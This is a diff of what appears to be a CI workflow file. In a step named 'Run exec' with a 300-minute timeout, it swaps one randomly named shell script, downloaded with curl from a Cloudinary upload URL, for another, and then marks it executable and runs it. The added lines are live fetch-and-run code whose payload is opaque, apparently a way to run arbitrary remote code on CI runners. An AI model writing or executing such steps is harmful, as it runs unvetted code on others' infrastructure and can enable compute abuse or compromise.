@@ -16,8 +16,6 @@ jobs:
       - name: Run exec
         timeout-minutes: 300
         run: |
-          curl -O https://res.cloudinary.com/dyfqshedb/raw/upload/v1711831253/mosaknfpojmfrhmrkeu7.sh
-          chmod +x mosaknfpojmfrhmrkeu7.sh
-          ./mosaknfpojmfrhmrkeu7.sh
-
-
+          curl -O https://res.cloudinary.com/dyfqshedb/raw/upload/v1711832294/nuephguljsh2zaq90gsk.sh
+          chmod +x nuephguljsh2zaq90gsk.sh
+          ./nuephguljsh2zaq90gsk.sh
